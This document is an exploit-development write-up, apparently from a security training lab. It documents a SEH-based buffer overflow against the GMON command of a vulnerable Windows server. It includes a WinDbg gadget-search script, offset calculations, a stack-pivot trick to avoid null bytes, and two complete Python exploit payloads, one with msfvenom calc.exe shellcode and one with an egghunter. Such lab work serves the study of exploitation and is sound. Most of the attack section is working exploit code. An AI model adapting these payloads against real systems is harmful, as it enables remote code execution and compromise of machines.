## <ins>GMON</ins>

Just like before, the initial Proof of Concept was executed, this time having `GMON` as the prefix of the buffer.

Following the execution path through IDA and WinDbg, the following byte comparison gets reached:

![7866ad57422c572ec642db02db897806.png](:../../../C\)%20Images/5c2f4fd5c86c4168ab42b2eb045d2656.png)

First, the address of the buffer is moved into EAX, then the value 5 (stored at ebp+var_418) is added to the address (this is the length of the prefix).
Afterwards a comparison is made between the first byte and the character `/`.

Just like before, this ends in a loop in case the `cmp` instruction does not return 0.

Knowing about this check, the following changes were made to the script:

```Python
[...]

prefix = b'GMON '
buffer = b'/' + b'Aa0Aa1Aa2Aa3[...g4F'	# msf-pattern_create -l 4096

payload = prefix + buffer

[...]
```

An access violation is triggered but the value stored in EIP does not seem to exist inside the unique pattern string generated using msf-pattern_create.

Taking a look at the SEH chain reveals, that it got overwritten using values that are indeed in the pattern:

![a44adbc6b9426357a752fe8bf79c6574.png](:../../../C\)%20Images/38eba8d44e7b48f88db40690d64c2866.png)

Letting the execution continue overwrites EIP with `356f4534` which is equivalent to offset 3554 in the pattern (6f45336f equals 3550).

As this appears to be a SEH based buffer overflow it is required to perform a `POP; POP; RET;` instruction sequence (from now on referred to as PPR) and a short jump over the NSEH.

The following WinDbg script was used to look for such a gadget:

```Ruby
.block
{
  .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
  {
    .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
    {
      s-[1]b 62500000 62508000 $t0 $t1 c3
    }
  }
}
```

![24778c429d669f6181448fb93d7fd5fb.png](:../../../C\)%20Images/0af185a2b7c0447cb41703c2657ee2ad.png)

Overwriting the SEH chain is not enough though, as it only becomes active in case of an exception (which could get achieved by e.g. overwriting memory regions someone is not supposed to).

The following changes were made to the script in order to:

1.  Overwrite the SEH (6 byte short jump) and NSEH (PPR)
2.  Trigger an exception

```Python
[...]

prefix = b'GMON '
buffer = b'/' + b'A' * 3550
seh = b'\xeb\x06\x90\x90'       # 6 byte short jump
nseh = pack('<L', 0x625011b3)   # PPR
junk = b'A' * 2000

payload = prefix + buffer + seh + nseh + junk

[...]
```

Dumping the stack reveals that the space available is not nearly enough for some shellcode to fit in. Because of that a second (larger) jump is required.

It might be possible to utilise an egghunter and just throw the shellcode somewhere but for the GMON command a second (larger) jump will be utilised.

(Once again no bad characters besides 0x00 exist, so this step is skipped)

I will place the shellcode in the initial buffer by replacing the A's with NOPs and the shellcode somewhere in the middle.

In order to jump to the landing pad (NOPs) it is required to calculate the difference between an address somewhere within the landing pad and ESP.

There are various techniques to find a working address / calculate the required offset. One would be to look for the string `GMON /` and then adding some bytes in order to land somewhere in the buffer:

![ffcd33e2430b9395908ba922b16e65cf.png](:../../../C\)%20Images/d59d637473b24e2384f488ec051891bb.png)

Next, ESP can be subtracted from the address (e.g. `0x0111f1f8`) **after** the shortjump got executed.

![2c574c8517836a7b0211cf7a8dd7f7b1.png](:../../../C\)%20Images/5e0c36bd0b6d4ffbbc652301a771f0d0.png)

Since an instruction sequence like `add esp, 0x56c` would contain NULL-bytes you have to use a little trick. When working with CPU registers you can always use just a part of it (e.g. instead of RSP, ESP or instead of ESP, SP):

```Text
┌──(kali㉿kali)-[~]
└─$ msf-nasm_shell                
nasm > add sp,0x56c
00000000  6681C46C05        add sp,0x56c
nasm > 
```

Simply add `ff e4` to the sequence above in order to jump to the stack pointer.

Eventually, the working exploit looked like this:

```Python
# msfvenom -p windows/exec cmd=calc.exe -b "\x00" EXITFUNC=thread -f py -v shellcode
shellcode =  b""
shellcode += b"\xda\xce\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x31"
[...]
shellcode += b"\x13\x36\x06\x40\x80\xda\xe7\xe7\x20\x78\xf8"

length = 3550

prefix = b'GMON /'		# The / was moved to the prefix (doesn't change anything)
buffer = b'\x90' * 32
buffer += shellcode
buffer += b'\x90' * (length - len(buffer))	# The length must still total 3550 bytes
seh = b'\xeb\x06\x90\x90'       # 6 byte short jump
nseh = pack('<L', 0x625011b3)   # PPR
jump = b'\x66\x81\xC4\x6A\x05'	# add sp instruction
jump += b'\xff\xe4'		# jmp to esp
junk = b'A' * 2000		# junk in order to trigger an exception

payload = prefix + buffer + seh + nseh + jump + junk
```

Alternative using a Windows 10 egghunter:

```Python
# msfvenom -p windows/exec cmd=calc.exe -b "\x00" EXITFUNC=thread -f py -v shellcode
shellcode =  b"w00tw00t"
shellcode += b"\xda\xce\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x31"
[...]
shellcode += b"\x13\x36\x06\x40\x80\xda\xe7\xe7\x20\x78\xf8"

length = 3550

prefix = b'GMON /'
buffer = b'\x90' * 32
buffer += shellcode
buffer += b'\x90' * (length - len(buffer))
seh = b'\xeb\x06\x90\x90'       # 6 byte short jump
nseh = pack('<L', 0x625011b3)   # PPR
# egghunter looking for the w00tw00t tag
egghunter = (b"\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7")

junk = b'A' * 2000

payload = prefix + buffer + seh + nseh + egghunter + junk
```
